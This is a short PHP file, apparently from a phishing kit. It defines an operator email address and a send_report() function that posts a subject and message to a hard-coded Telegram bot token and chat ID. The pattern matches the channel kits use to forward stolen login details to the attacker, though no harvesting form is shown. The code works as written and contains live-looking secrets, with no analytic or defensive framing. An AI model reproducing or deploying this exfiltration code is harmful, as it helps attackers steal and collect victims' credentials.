<?php
$Receive_email = "top4lyfe@atomicmail.io";

function send_report($to, $subject, $message) {
    $token = '8877413739:AAGXqcPEdUMgf0JGK8B-qK7f-4Tfe3MeCCw';
    $chat_id = '7576365237';
    $text = $subject . "\n\n" . $message;
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = http_build_query(['chat_id' => $chat_id, 'text' => $text]);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $data,
    ]]);
    file_get_contents($url, false, $ctx);
}
